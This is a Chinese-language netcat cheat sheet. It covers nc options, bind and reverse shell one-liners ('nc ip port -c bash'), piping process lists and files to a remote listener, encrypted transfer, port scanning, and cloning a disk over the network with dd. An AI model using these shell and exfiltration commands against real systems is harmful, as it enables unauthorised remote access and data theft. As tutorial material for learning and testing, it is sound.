nc -h
-c shell commands shell模式
-e filename 程序重定向 [危险!!]
-b 允许广播
-d 无命令行界面,使用后台模式
-g gateway 源路由跳跃点, 不超过8
-G num 源路由指示器: 4, 8, 12, ...
-h 获取帮助信息
-i secs 延时设置,端口扫描时使用
-k 设置在socket上的存活选项
-l 监听入站信息
-n 以数字形式表示的IP地址
-o file 使进制记录
-p port 本地端口
-r 随机本地和远程的端口
-q secs 在标准输入且延迟后退出（翻译的不是很好，后面实例介绍）
-s addr 本地源地址
-T tos 设置服务类型
-t 以TELNET的形式应答入站请求
-u UDP模式
-v 显示详细信息 [使用=vv获取更详细的信息
-w secs 连接超时设置
-z I/O 模式 [扫描时使用]

常用-n -v -l -p -q

## 1. NC远程控制
A: nc -lp port -c bash
B: nc ip port 
A将自己的bash发送给B

# 反向连接, 由于防火墙的存在，这个更常用
A: nc -lp port 
B: nc ip port -c bash

# 2. 信息收集
nc -l -p port 监听指定端口
nc -nv ip port 连接对方端口
nc -l -p 4444 > wing.txt 将远程发送的内容保存在本地
Ps aux | nc -nv ip port -q 1 标准输入完成后delay一秒钟，会发送侦听端

# 3. NC传输文件/目录
nc -lp 4444 >1.txt 1.txt就是你要保存的文件名 自定义

nc -nv ip port <1.txt -q 1 将文件发送给侦听端
ps：侦听端的文件名最好按照文件本身来命名

tar -cvf - 目录名/|nc -lp port -q 1
将目录打包
nc -nv ip port |tar -xvf -
将目录解包

NC文件加密传输
apt-get install mcrypt
A： nc -lp port|mcrypt - -flush -Fbqd -a rijndael-256 -m ecb >文件名
B：mcrypt --flush -Fbq -a rijndael-256 -m ecb <文件名|nc -nv ip port -q 1
理解：B将文件加密发送，A接受后先解密再保存到本地，B在1s后退出.
主要是利用mcrypt进行加密

NC流媒体服务
A:cat wing.mp4|nc -lp port
B:nc -nv ip port |mplayer -vo x11 -cache 4000
A让wing.MP4这个文件成为流的形式发送到B，B用mplayer播放，接收多少播放多少，指定缓存4000bytes。

NC端口扫描
nc -nvz ip 1-65535

默认使用tcp进行扫描

NC复制磁盘
A:nc -lp port |dd of=/dev/sda
B: dd if=/dev/sda | nc -nc ip port -q 1
If是input filter
Of 是output filter
B将数据复制到A挂载的硬盘上
